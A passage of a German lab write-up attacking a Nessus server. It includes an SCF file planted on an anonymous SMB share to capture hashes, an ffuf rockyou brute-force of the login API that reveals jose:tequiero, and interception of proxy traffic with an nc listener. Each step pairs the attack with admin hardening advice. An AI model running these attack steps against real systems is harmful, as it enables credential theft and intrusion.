+                <strong>Analyse:</strong> Ich verwende Nikto, um einen automatisierten Schwachstellen-Scan auf der Nessus-Oberfläche auf Port 8834 (HTTPS) durchzuf&uuml;hren (<code>nikto -h https://192.168.2.65:8834</code>). Die Ausgabe best&auml;tigt das SSL-Zertifikat (<span class="command">CN=WIN-C05BOCC7F0H</span>) und den Server <span class="command">NessusWWW</span>. Es meldet eine Zertifikats-Warnung, da der Hostname (IP-Adresse) nicht mit dem CN im Zertifikat &uuml;bereinstimmt (<span class="password">Hostname &#x27;192.168.2.65&#x27; does not match certificate&#x27;s names: WIN-C05BOCC7F0H</span>). Nikto findet auch fehlende Sicherheits-Header (<span class="password">X-Content-Type-Options</span>) und potenzielle Schwachstellen, die f&uuml;r ColdFusion und Abyss relevant sind (<code>/nul.cfm</code>, <code>/nul.dbm</code>, viele Slashes), obwohl Nessus keine dieser Technologien verwendet. Diese letzten Treffer scheinen generische Tests von Nikto zu sein, die hier falsch-positive Ergebnisse liefern oder nicht anwendbar sind. Der Scan bricht aufgrund eines Fehlerlimits ab (<span class="password">ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can&#x27;t connect: Connect failed: ; Connection refused</span>).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Nikto liefert n&uuml;tzliche Informationen über das Zertifikat und fehlende Header. Die generischen Schwachstellentests f&uuml;r ColdFusion etc. sind hier irrelevant und deuten auf Einschränkungen des Scanners bei unbekannten Zielen hin. Die Zertifikatswarnung ist typisch f&uuml;r selbstsignierte Zertifikate, aber nicht direkt ausnutzbar. Der Abbruch des Scans kann an der spezifischen API-Struktur von Nessus liegen, mit der Nikto nicht umgehen kann.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze automatisierte Scanner, aber bewerte die Ergebnisse kritisch, insbesondere bei unbekannten oder nicht-Standard-Webanwendungen. Konzentriere dich auf manuelle Tests und die Analyse der API, wenn Scanner fehlschlagen oder unzuverl&auml;ssige Ergebnisse liefern.
+                <br><strong>Empfehlung (Admin):</strong> Verwende gültige SSL/TLS-Zertifikate. Beachte Zertifikatswarnungen. Behebe fehlende Sicherheits-Header.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">nikto -h https://192.168.2.65:8834</span>          
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">- Nikto v2.5.0</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ Target IP:          192.168.2.65</span>
+<span class="command">+ Target Hostname:    192.168.2.65</span>
+<span class="command">+ Target Port:        8834</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ SSL Info:        Subject:  /O=Nessus Users United/OU=Nessus Server/L=New York/C=US/ST=NY/CN=WIN-C05BOCC7F0H</span>
+<span class="command">                   Ciphers:  TLS_AES_256_GCM_SHA384</span>
+<span class="command">                   Issuer:   /O=Nessus Users United/OU=Nessus Certification Authority/L=New York/C=US/ST=NY/CN=Nessus Certification Authority</span>
+<span class="command">+ Start Time:         2025-06-27 23:20:33 (GMT2)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ Server: NessusWWW</span>
+<span class="command">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span>
+<span class="password">+ Hostname '192.168.2.65' does not match certificate's names: WIN-C05BOCC7F0H. See: [Link: 297.html | Ziel: https://cwe.mitre.org/data/definitions/297.html]</span>
+<span class="command">+ /: The Content-Encoding header is set to &quot;deflate&quot; which may mean that the server is vulnerable to the BREACH attack. See: [Link: http://breachattack.com/ | Ziel: http://breachattack.com/]</span>
+<span class="password">+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: [Link: missing-content-type-header | Ziel: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/]</span>
+<span class="command">+ /nul.cfm: ColdFusion 5.0 and below, 4.0-5.0 reveal file system paths of .cfm or .dbm files when the request contains invalid DOS devices. [Link: CVE-2002-0576 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576]. KPMG-2002013. [Link: http://www.securityfocus.com/bid/4542 | Ziel: http://www.securityfocus.com/bid/4542]. [Link: http://www.macromedia.com/v1/handlers/index.cfm?ID=22906 | Ziel: http://www.macromedia.com/v1/handlers/index.cfm?ID=22906]. See: [Link: CVE-2002-0576 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576]</span>
+<span class="command">+ /nul.dbm: ColdFusion 5.0 and below, 4.0-5.0 reveal file system paths of .cfm or .dbm files when the request contains invalid DOS devices. [Link: CVE-2002-0576 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576]. KPMG-2002013. [Link: http://www.securityfocus.com/bid/4542 | Ziel: http://www.securityfocus.com/bid/4542]. [Link: http://www.macromedia.com/v1/handlers/index.cfm?ID=22906 | Ziel: http://www.macromedia.com/v1/handlers/index.cfm?ID=22906]. See: [Link: CVE-2002-0576 | Ziel: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0576]</span>
+<span class="password">+ ERROR: Error limit (20) reached for host, giving up. Last error: opening stream: can't connect: Connect failed: ; Connection refused at /var/lib/nikto/plugins/LW2.pm line 5254.</span>
+<span class="password">: Connection refused</span>
+<span class="password">+ Scan terminated: 20 error(s) and 5 item(s) reported on remote host</span>
+<span class="command">+ End Time:           2025-06-27 23:22:53 (GMT2) (140 seconds)</span>
+<span class="command">---------------------------------------------------------------------------</span>
+<span class="command">+ 1 host(s) tested</span>
+</pre></div>
+            </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <!-- Hier die Initial Access-Schritte einfügen -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich untersuche die Metadaten einer der &uuml;ber SMB heruntergeladenen PDF-Dateien (<code>My Basic Network Scan_hwhm7q.pdf</code>) mit <code>exiftool</code>. Metadaten k&ouml;nnen Informationen &uuml;ber den Ersteller, das verwendete Programm, das Erstellungsdatum und manchmal sogar versteckte Kommentare oder Details enthalten. Die Ausgabe von <code>exiftool</code> zeigt verschiedene Informationen, darunter das <span class="command">File Name</span>, <span class="command">File Size</span>, <span class="command">File Modification Date/Time</span> etc. Besonders interessant ist das Feld <span class="command">Author</span>, das den Wert &quot;<span class="command">Jose</span>&quot; enth&auml;lt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Identifizierung des Autors &quot;Jose&quot; in den Metadaten der PDF-Datei ist ein wichtiger Fund. &quot;Jose&quot; ist ein potenzieller Benutzername auf dem System. Die Kenntnis dieses Benutzernamens kann f&uuml;r Brute-Force-Angriffe (SMB, RDP, Nessus-Login) oder zur Nutzung gefundener Anmeldedaten relevant sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere Metadaten von Dokumenten, Bildern oder anderen Dateien, die du auf dem Zielsystem findest. Nutze Tools wie exiftool oder Online-Metadaten-Viewer. Suche nach Benutzernamen, Computernamen, Speicherorten oder Hinweisen auf die Systemstruktur oder verwendete Software.
+                <br><strong>Empfehlung (Admin):</strong> Entferne Metadaten aus Dokumenten, insbesondere aus &ouml;ffentlich zug&auml;nglichen Dateien, um die Preisgabe von Informationen zu vermeiden. Verwende Tools zur Metadatenbereinigung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/nessus] 
+└─# <span class="command">exiftool My\ Basic\ Network\ Scan_hwhm7q.pdf</span>    
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">ExifTool Version Number         : 13.25</span>
+<span class="command">File Name                       : My Basic Network Scan_hwhm7q.pdf</span>
+<span class="command">Directory                       : .</span>
+<span class="command">File Size                       : 122 kB</span>
+<span class="command">File Modification Date/Time     : 2025:06:27 23:14:52+02:00</span>
+<span class="command">File Access Date/Time           : 2025:06:27 23:30:13+02:00</span>
+<span class="command">File Inode Change Date/Time     : 2025:06:27 23:14:52+02:00</span>
+<span class="command">File Permissions                : -rw-r--r--</span>
+<span class="command">...</span>
+<span class="command">..</span>
+<span class="command">Format                          : application/pdf</span>
+<span class="command">Language                        : x-unknown</span>
+<span class="command">---------------------------------------------------------------------</span>
+<span class="command">Author                          : Jose</span>
+<span class="command">---------------------------------------------------------------------</span>
+<span class="command">PDF Version                     : 1.4</span>
+<span class="command">Producer                        : Apache FOP Version 2.8</span>
+<span class="command">Create Date                     : 2024:10:18 15:10:05+02:00</span>
+<span class="command">Creator Tool                    : Apache FOP Version 2.8</span>
+<span class="command">Metadata Date                   : 2024:10:18 15:10:05+02:00</span>
+<span class="command">Page Mode                       : UseOutlines</span>
+<span class="command">Creator                         : Apache FOP Version 2.8</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich suche auf Exploit-Databases nach bekannten Remote Code Execution (RCE) Schwachstellen f&uuml;r PHP Version 5.6, da der Apache Webserver PHP 7.2.0 verwendet, aber es könnte ältere Installationen oder Konfigurationen geben, die PHP 5.6 betreffen, oder ich mache einen breiteren Suchlauf. Der Befehl <code>searchsploit php 5.6 rce</code> sucht in der lokalen Exploit-Database-Kopie. Die Ausgabe zeigt einen Treffer: &quot;<span class="command">Kerio WinRoute Firewall Web Server &lt; 6 - Source Code Disclo | php/webapps/18857.txt</span>&quot;.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Auffinden eines RCE-Exploits f&uuml;r PHP 5.6 ist relevant, wenn das Ziel tatsächlich eine so alte PHP-Version irgendwo anders betreibt oder eine falsch positive Identifizierung vorlag. Der gefundene Exploit scheint f&uuml;r Kerio WinRoute Firewall zu sein, was auf diesem System (Windows Server mit Apache/Nessus) wahrscheinlich nicht zutrifft. Es ist wichtig, die Ergebnisse von Exploit-Datenbanken kritisch zu pr&uuml;fen und auf das spezifische Zielsystem anzuwenden. Da die LFI bereits einen einfachen Weg zu Informationen &ouml;ffnet, ist dieser Exploit weniger relevant f&uuml;r den aktuellen Fall.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche auf Exploit-Datenbanken nach bekannten Schwachstellen f&uuml;r alle identifizierten Dienste und Versionen. Prüfe die Anwendbarkeit der gefundenen Exploits auf das spezifische Zielsystem.
+                <br><strong>Empfehlung (Admin):</strong> Halte alle Softwarekomponenten (Webserver, PHP, etc.) aktuell, um bekannte Schwachstellen zu vermeiden.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">searchsploit php 5.6 rce</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="command">------------------------------------------------------------ ---------------------------------</span>
+<span class="command"> Exploit Title                                              |  Path</span>
+<span class="command">------------------------------------------------------------ ---------------------------------</span>
+<span class="command">Kerio WinRoute Firewall Web Server &lt; 6 - Source Code Disclo | php/webapps/18857.txt</span>
+<span class="command">------------------------------------------------------------ ---------------------------------</span>
+<span class="command">Shellcodes: No Results</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich erstelle eine SCF-Datei namens `crackmich.scf` (wahrscheinlich ein Tippfehler und sollte `crackmapexec.scf` oder &auml;hnlich sein, oder ein benutzerdefinierter Name). SCF-Dateien können dazu missbraucht werden, SMB-Authentifizierungsversuche auszulösen, wenn ein Benutzer den Ordner &ouml;ffnet, der die Datei enth&auml;lt. Der Inhalt einer solchen Datei w&uuml;rde einen UNC-Pfad zu einer Ressource auf meinem Kali-System enthalten, die eine SMB-Verbindung erfordert. Ich navigiere in mein Arbeitsverzeichnis (`cd nessus`). Ich erstelle die Datei mit `vi crackmich.scf` (der Inhalt selbst ist nicht im Log). Dann lade ich die Datei &uuml;ber SMB in die anonym zug&auml;ngliche `Documents`-Freigabe hoch (<code>smbclient //192.168.2.65/Documents -N</code> gefolgt von <code>put crackmich.scf</code>). Der <code>ls</code> Befehl best&auml;tigt den erfolgreichen Upload von <span class="command">crackmich.scf</span> (53 Bytes).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Hochladen einer b&ouml;sartigen SCF-Datei in eine öffentlich zugängliche SMB-Freigabe ist eine Technik, um Benutzer zur SMB-Authentifizierung zu zwingen, wenn sie den Ordner &ouml;ffnen. Wenn ein Benutzer (insbesondere ein privilegierter wie Administrator) die `Documents`-Freigabe &ouml;ffnet, k&ouml;nnte sein System versuchen, sich mit meinem Kali-System zu authentifizieren, wobei ich den Hash des Benutzers abfangen kann. Dies ist ein potenzieller Weg, um einen Benutzer-Hash zu erlangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze öffentlich zug&auml;ngliche Shares, um b&ouml;sartige Dateien zu platzieren, die Benutzer zur Ausf&uuml;hrung oder Authentifizierung zwingen (SCF, LNK, HTA etc.). Richte einen Listener (Responder.py, ntlmrelayx.py) auf deinem System ein, um die Hashes abzufangen.
+                <br><strong>Empfehlung (Admin):</strong> Deaktiviere anonymen SMB-Zugriff. Deaktiviere NTLMv1 und erzwinge NTLMv2 oder Kerberos. Implementiere SMB-Signierung. Schärfe Richtlinien f&uuml;r die Verarbeitung von SCF/LNK-Dateien.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">cd nessus</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/nessus] 
+└─# <span class="command">vi crackmich.scf</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+
+</pre></div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~/nessus] 
+└─# <span class="command">smbclient //192.168.2.65/Documents -N</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">Try &quot;help&quot; to get a list of possible commands.</span>
+<span class="command">smb: \> put crackmich.scf</span> 
+<span class="command">putting file crackmich.scf as \crackmich.scf (0,1 kb/s) (average 0,1 kb/s)</span>
+<span class="command">smb: \> ls</span>
+<span class="command">  .                                  DR        0  Fri Jun 27 23:45:12 2025</span>
+<span class="command">  ..                                  D        0  Sat Oct 19 07:08:23 2024</span>
+<span class="command">  crackmich.scf                       A       53  Fri Jun 27 23:45:12 2025</span>
+<span class="command">  desktop.ini                       AHS      402  Sat Jun 15 19:54:33 2024</span>
+<span class="command">  My Basic Network Scan_hwhm7q.pdf      A   122006  Sat Oct 19 00:19:59 2024</span>
+<span class="command">  My Music                        DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  My Pictures                     DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  My Videos                       DHSrn        0  Sat Jun 15 19:54:27 2024</span>
+<span class="command">  Web Application Tests_f6jg9t.pdf      A   136025  Sat Oct 19 00:20:14 2024</span>
+
+<span class="command">		12942591 blocks of size 4096. 10716661 blocks available</span>
+</pre></div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Hier die Privilege Escalation-Schritte einfügen -->
+             <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf der Feroxbuster-Ausgabe, die den Endpunkt <span class="command">/session</span> auf der Nessus-API auf Port 8834 identifiziert hat, versuche ich, die Login-API zu verstehen, um Anmeldedaten zu testen. Der hier gezeigte Request (`POST /session HTTP/1.1`) zeigt, dass der Login über eine POST-Anfrage an den `/session` Endpunkt erfolgt. Der `Content-Type` ist <span class="command">application/json</span>, was bedeutet, dass Benutzername und Passwort im JSON-Body gesendet werden. Der Body enth&auml;lt <span class="command">{&quot;username&quot;:&quot;jose&quot;,&quot;password&quot;:&quot;jose&quot;}</span> – dies ist wahrscheinlich eine Beispielanfrage oder ein Testversuch mit dem Benutzernamen "jose", den ich aus den PDF-Metadaten extrahiert habe, und einem Standardpasswort. Der Header <span class="command">X-Api-Token: 3d27a65d-e7eb-40a0-8931-1d086d046d29</span> ist ebenfalls vorhanden, was darauf hindeutet, dass API-Aufrufe ein Token erfordern k&ouml;nnten, obwohl er hier im Login-Request selbst gesendet wird, was ungew&ouml;hnlich ist. Es k&ouml;nnte ein fester API-Schl&uuml;ssel oder ein Hinweis sein.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Analyse der Login-Anfrage-Struktur ist entscheidend. Das Wissen, dass der Login über POST an `/session` mit JSON-Body (username/password) erfolgt, ermöglicht mir, Brute-Force-Angriffe gegen diesen Endpunkt durchzuführen. Die Entdeckung des Benutzernamens "jose" aus den PDF-Metadaten und das Vorhandensein des API-Tokens sind wichtige Puzzleteile.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere die API-Struktur und die Authentifizierungsmechanismen von Webanwendungen mit einem Web-Proxy. Führe gezielte Brute-Force-Angriffe gegen den Login-Endpunkt mit gesammelten Benutzernamen und Wortlisten durch. Untersuche alle Header auf potenziell sensible Informationen oder API-Schl&uuml;ssel.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere Ratenbegrenzung und Account-Sperrmechanismen f&uuml;r API-Login-Endpunkte. Verwende sichere API-Schl&uuml;sselverwaltung und vermeide das Einbetten von Schl&uuml;sseln in client-seitigem Code oder Requests. Logge fehlgeschlagene Login-Versuche.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">POST /session HTTP/1.1</span>
+<span class="command">Host: 192.168.2.65:8834</span>
+<span class="command">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0</span>
+<span class="command">Accept: */*</span>
+<span class="command">Accept-Language: en-US,en;q=0.5</span>
+<span class="command">Accept-Encoding: gzip, deflate, br</span>
+<span class="command">Content-Type: application/json</span>
+<span class="command">X-Api-Token: 3d27a65d-e7eb-40a0-8931-1d086d046d29</span>
+<span class="command">Content-Length: 37</span>
+<span class="command">Origin: https://192.168.2.65:8834</span>
+<span class="command">Referer: https://192.168.2.65:8834/</span>
+<span class="command">Sec-Fetch-Dest: empty</span>
+<span class="command">Sec-Fetch-Mode: cors</span>
+<span class="command">Sec-Fetch-Site: same-origin</span>
+<span class="command">Priority: u=0</span>
+<span class="command">Te: trailers</span>
+<span class="command">Connection: keep-alive</span>
+
+<span class="command">{&quot;username&quot;:&quot;jose&quot;,&quot;password&quot;:&quot;jose&quot;}</span>
+</pre></div>
+            </div>
+             <p class="analysis">
+                <strong>Analyse:</strong> Ich f&uuml;hre einen Brute-Force-Angriff gegen den Nessus API Login-Endpunkt auf Port 8834 (HTTPS) mit dem Tool ffuf durch. Ich ziele auf die URL <code>https://192.168.2.65:8834/session</code> ab (<code>-u</code>) und verwende die POST-Methode (<code>-X POST</code>). Ich setze die notwendigen Header (`Content-Type: application/json`, `X-Api-Token: 3d27a65d-e7eb-40a0-8931-1d086d046d29` - dieser Token k&ouml;nnte aus dem JS-Code extrahiert worden sein oder war im Request-Beispiel sichtbar). Die Daten (`-d`) sind die JSON-Anfrage `{&quot;username&quot;:&quot;jose&quot;,&quot;password&quot;:&quot;FUZZ&quot;}`. Das Wortlisten-Fuzzing (`-w /usr/share/wordlists/rockyou.txt`) ersetzt das `FUZZ` im Passwortfeld durch Eintr&auml;ge aus der rockyou.txt Wortliste. Ich filtere auf den Statuscode <span class="password">200 OK</span> (`-mc 200`), da ein erfolgreicher Login wahrscheinlich einen 200er Status zur&uuml;ckgibt. Die Ausgabe zeigt einen Treffer: Die Payload <span class="command">tequiero</span> lieferte den Status <span class="password">200</span>. Dies ist das Passwort f&uuml;r den Benutzer "jose". Der Scan wurde manuell abgebrochen (`Caught keyboard interrupt (Ctrl-C)`) nach dem Fund.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Das Brute-Forcing des Nessus-Logins war erfolgreich und lieferte die Anmeldedaten <span class="command">jose:<span class="password">tequiero</span></span>. Die Kombination aus dem Benutzernamen aus Metadaten, der Analyse der API-Anfrage und einem gezielten Wortlistenangriff f&uuml;hrte zum Erfolg. Ich habe nun Administratorrechte (oder zumindest hohe Rechte) auf der Nessus-Instanz.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> F&uuml;hre Brute-Force-Angriffe gegen Login-Endpunkte durch, wenn keine Account-Sperre existiert. Nutze gesammelte Benutzernamen und relevante Wortlisten. Passe die Requests genau an die API-Struktur an.
+                <br><strong>Empfehlung (Admin):</strong> Implementiere Account-Sperrmechanismen f&uuml;r die Nessus-Login-Oberfläche und API. Erzwinge starke Passw&ouml;rter. Überwache fehlgeschlagene Login-Versuche.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">ffuf -u https://192.168.2.65:8834/session -X POST -H &quot;Content-Type: application/json&quot; -H &quot;X-Api-Token: 3d27a65d-e7eb-40a0-8931-1d086d046d29&quot; -d &#x27;{&quot;username&quot;:&quot;jose&quot;,&quot;password&quot;:&quot;FUZZ&quot;}&#x27; -w /usr/share/wordlists/rockyou.txt -mc 200</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       <span class="command">v2.1.0-dev</span>
+<span class="command">________________________________________________</span>
+
+<span class="command"> :: Method           : POST</span>
+<span class="command"> :: URL              : https://192.168.2.65:8834/session</span>
+<span class="command"> :: Wordlist         : FUZZ: /usr/share/wordlists/rockyou.txt</span>
+<span class="command"> :: Header           : Content-Type: application/json</span>
+<span class="command"> :: Header           : X-Api-Token: 3d27a65d-e7eb-40a0-8931-1d086d046d29</span>
+<span class="command"> :: Data             : {&quot;username&quot;:&quot;jose&quot;,&quot;password&quot;:&quot;FUZZ&quot;}</span>
+<span class="command"> :: Follow redirects : false</span>
+<span class="command"> :: Calibration      : false</span>
+<span class="command"> :: Timeout          : 10</span>
+<span class="command"> :: Threads          : 40</span>
+<span class="command"> :: Matcher          : Response status: 200</span>
+<span class="command">________________________________________________</span>
+
+<span class="password">tequiero</span>                <span class="password">[Status: 200, Size: 179, Words: 1, Lines: 1, Duration: 1404ms]</span>
+<span class="command">:: Progress: [560/14344493] :: Job [1/1] :: 33 req/sec :: Duration: [0:00:18] :: Errors: 0 ::</span><span class="password">^[WARN] Caught keyboard interrupt (Ctrl-C)</span>
+</pre></div>
+            </div>
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Nessus-Anmeldedaten <span class="command">jose:<span class="password">tequiero</span></span> erhalten und kann mich nun auf der Nessus-Weboberfläche anmelden. Dies erm&ouml;glicht mir, Nessus-Einstellungen einzusehen und potenziell f&uuml;r die Privilegieneskalation zu missbrauchen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erfolgreiche Login in die Nessus-Oberfläche mit gefundenen Anmeldedaten ist ein kritischer Schritt. Ich habe nun Zugriff auf ein mächtiges Tool, das mit hohen Privilegien auf dem System l&auml;uft. Die Untersuchung der Nessus-Konfiguration nach weiteren Schwachstellen oder Hinweisen ist nun prim&auml;r.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche die Konfiguration einer kompromittierten Nessus-Instanz gr&uuml;ndlich. Suche nach API-Schl&uuml;sseln, gespeicherten Anmeldedaten f&uuml;r Scans, Proxy-Einstellungen, Plugins oder anderen Hinweisen.
+                <br><strong>Empfehlung (Admin):</strong> Schütze Nessus-Zugänge streng. Überprüfe und ändere Standard-Anmeldedaten sofort. Begrenze die Rechte des Nessus-Dienstkontos, wenn m&ouml;glich.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <pre>
+<span class="command">https://192.168.2.65:8834</span> 
+<span class="command">jose:</span><span class="password">tequiero</span>
+
+<span class="command">login zu https://192.168.2.65:8834/#/scans/folders/my-scans</span>
+</pre></div>
+            </div>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+            <!-- Hier die Privilege Escalation-Schritte einfügen -->
+            <p class="analysis">
+                <strong>Analyse:</strong> Das Bild zeigt einen Screenshot der Proxy-Server-Einstellungen innerhalb der Nessus-Weboberfläche, auf die ich mich mit den Anmeldedaten <span class="command">jose:<span class="password">tequiero</span></span> angemeldet habe. Die Einstellungen zeigen, dass ein Proxy-Server konfiguriert ist: <span class="command">Host 192.168.2.199</span> und <span class="command">Port 8080</span> mit <span class="command">Username nesus</span> und <span class="command">Auth Method Auto Detect</span>. Dies ist extrem interessant, da 192.168.2.199 meine Kali-Angreifer-IP ist und Port 8080 ein h&auml;ufig verwendeter Port f&uuml;r Proxy-Listener ist. Jemand hat Nessus so konfiguriert, dass es über einen Proxy auf meinem System kommuniziert und dabei einen Benutzernamen &#x27;nesus&#x27; verwendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Die Proxy-Einstellungen in Nessus sind ein direkter Hinweis auf einen potenziellen Anmeldedaten-Leak. Die Konfiguration eines Proxys, der auf meinem Angreifer-System l&auml;uft, bedeutet, dass alle über diesen Proxy laufenden Nessus-Kommunikationen (z.B. Plugin-Updates, externe Konnektivität) von mir abgefangen und analysiert werden k&ouml;nnen. Der Benutzername &#x27;nesus&#x27; ist ebenfalls neu und interessant. Dies ist ein sehr vielversprechender Weg, um weitere Anmeldedaten abzufangen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche in kompromittierten Anwendungen oder Systemen immer nach Proxy-Einstellungen oder anderen Konfigurationen, die auf Verbindungen zu externen Systemen hindeuten. Richte einen Listener auf deinem System ein, um solchen Traffic abzufangen und zu analysieren. Suche nach Anmeldedaten oder API-Schl&uuml;sseln im abgefangenen Traffic.
+                <br><strong>Empfehlung (Admin):</strong> &Uuml;berpr&uuml;fe die Konfiguration von Anwendungen auf ungew&ouml;hnliche Proxy-Einstellungen. Überwache ausgehenden Netzwerkverkehr von kritischen Systemen und Anwendungen. Vermeide die Nutzung von Proxies auf extern kontrollierten Systemen.
+            </p>
+            <img src="nessus_creds_leak.jpg" alt="hier sieht man ein passwort leak in den nessus proxy einstellungen" />
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe auf meinem Kali-System einen Netcat-Listener auf Port 8080 eingerichtet (<code>nc -lvnp 8080</code>), um den Proxy-Verkehr von Nessus abzufangen. Die Nessus-Instanz ist so konfiguriert, dass sie &uuml;ber diesen Proxy kommuniziert. Die Ausgabe des Listeners zeigt eine eingehende Verbindung vom Zielsystem (192.168.2.65). Die empfangenen Daten zeigen eine <code>CONNECT plugins.nessus.org:443</code> Anfrage, was bedeutet, dass Nessus versucht, eine Verbindung zum Plugin-Server &uuml;ber meinen Proxy aufzubauen. Die Header zeigen <span class="command">Host: plugins.nessus.org</span> und <span class="command">User-Agent: Nessus/10.7.3</span>. **Wichtig:** In dieser Anfrage ist **kein Proxy-Authorization-Header** sichtbar, obwohl ein Benutzername (&quot;nesus&quot;) konfiguriert war und die Auth Method auf &quot;Auto Detect&quot; stand.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Abfangen des Proxy-Traffics funktioniert. Die Tatsache, dass Nessus versucht, Plugins zu aktualisieren, ist n&uuml;tzlich. Das Fehlen des Proxy-Authorization-Headers in diesem ersten abgefangenen Request (w&auml;hrend die Auth Method auf &quot;Auto Detect&quot; stand) deutet darauf hin, dass Nessus in diesem Modus m&ouml;glicherweise versucht, sich ohne Anmeldedaten zu verbinden oder einen anderen Mechanismus verwendet, der von Netcat nicht erkannt wird. Ich muss die Proxy-Authentifizierungsmethode in Nessus ändern, um zu versuchen, die Anmeldedaten zu erzwingen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Analysiere den abgefangenen Proxy-Verkehr gr&uuml;ndlich. Wenn keine Anmeldedaten abgefangen werden, versuche, die Authentifizierungsmethode auf dem Zielsystem zu ändern (z.B. von Auto Detect zu Basic), um die Übermittlung der Anmeldedaten zu erzwingen.
+                <br><strong>Empfehlung (Admin):</strong> Überwache den Inhalt von Netzwerkverkehr, der über Proxies l&auml;uft, insbesondere auf Anmeldedaten in Klartext oder einfach kodierter Form (wie Basic Auth).
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">
+┌──(root㉿CCat)-[~] 
+└─# <span class="command">nc -lvnp 8080</span>
+                     </div>
+                 </div>
+                 <div class="terminal"><pre>
+<span class="password">listening on [any] 8080 ...</span>
+<span class="password">connect to [192.168.2.199] from (UNKNOWN) [192.168.2.65] 49741</span>
+<span class="command">CONNECT plugins.nessus.org:443 HTTP/1.1</span>
+<span class="command">Host: plugins.nessus.org</span>
+<span class="command">Connection: keep-Alive</span>
+<span class="command">User-Agent: Nessus/10.7.3</span>
+<span class="command">Content-Length: 0</span>
+<span class="command">Proxy-Connection: Keep-Alive</span>
+</pre></div>
+            </div>
+            <p class="analysis">
